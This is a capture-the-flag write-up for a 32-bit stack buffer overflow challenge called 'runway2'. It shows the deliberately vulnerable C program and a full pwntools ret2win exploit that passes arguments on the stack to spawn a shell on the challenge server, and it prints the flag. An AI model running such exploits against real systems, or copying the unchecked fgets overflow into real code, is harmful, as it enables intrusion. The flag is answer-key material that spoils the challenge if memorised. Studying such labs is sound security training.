# runway2

This challenge provided the following `runway2.c` file:

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <fcntl.h>
#include <sys/sendfile.h>

int win(int check, int mate) {
    if (check == 0xc0ffee && mate == 0x007ab1e) {
        printf("You win! Here is your shell:\n");
        fflush(stdout);

        system("/bin/sh");
    } else {
        printf("No way!");
        fflush(stdout);
    }
}

int get_answer() {
    char answer[16];

    fgets(answer, 0x40, stdin);

    return strtol(answer, NULL, 10);
}

int calculate_answer(int op1, int op2, int op) {
    switch (op)
    {
        case 0:
            return (op1 + op2);
        case 1:
            return (op1 - op2);
        case 2:
            return (op1 * op2);
        case 3:
            return (op1 / op2);
        default:
            exit(-1);
    }
}

int main() {
    int op1;
    int op2;
    int op;
    char operands[5] = "+-*/";
    int input;
    int answer;

    srand(time(0));

    printf("Pop quiz!\n");
    fflush(stdout);

    op1 = rand() % 30;
    op2 = rand() % 30;
    op = rand() % 4;

    printf("What is %d %c %d?\n", op1, op[operands], op2);
    fflush(stdout);

    input = get_answer();
    answer = calculate_answer(op1, op2, op);

    if (input == answer) {
        printf("Good job! No flag though :)\n");
    } else {
        printf("I don't think you're trying very hard.\n");
    }

    return 0;
}
```

This challenge, similar to `runway1`, is a `ret2win` challenge, just that this time the `win` function
expects some arguments.

To figure out how to pass these arguments, let's take a look at the provided `Makefile`:

```makefile
all: runway2.c
        gcc runway2.c -o runway2 -fno-stack-protector -no-pie -m32
```

This uses the same compiler options as in `runway1`, but this time `-m32` is more meaningful. In 32-bit
binaries, the aguments are stored on the stack rather than in registers. This makes the call rather
easier, since we don't have to deal with finding a way to get those arguments in the right registers.

As with `runway1`, I used [this site](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) to get
a cyclic string to paste into `pwndbg`, which gave me this:

> Invalid address 0x62413961

For which that site returned an offset of `28`.

Using that, I built my exploit, with the arguments for the function placed two bytes after the `win` address:

```python
import pwn

pwn.context.terminal = ["tmux", "splitw", "-h"]
pwn.context.binary = elf = pwn.ELF("./runway2")


if pwn.args.REMOTE:
    io = pwn.remote("challs.pwnoh.io",13402)
else:
    io = pwn.process("./runway2")

win = elf.symbols["win"]

io.recvline()
io.recvline()

payload = b'A' * 28
rop_chain = [
            win, 0, 0xc0ffee, 0x007ab1e
            ]
for directive in rop_chain:
    payload += (directive).to_bytes(4, "little")
io.sendline(payload)

io.interactive()
```

And here's that in action:
```
# python3 exploit.py REMOTE SILENT
You win! Here is your shell:
$ ls
flag.txt
run
$ cat flag.txt
bctf{I_m1sS_4r1thm3t1c_qu1ZZ3s_2349adb53baa2955}
```

Giving the flag `bctf{I_m1sS_4r1thm3t1c_qu1ZZ3s_2349adb53baa2955}`
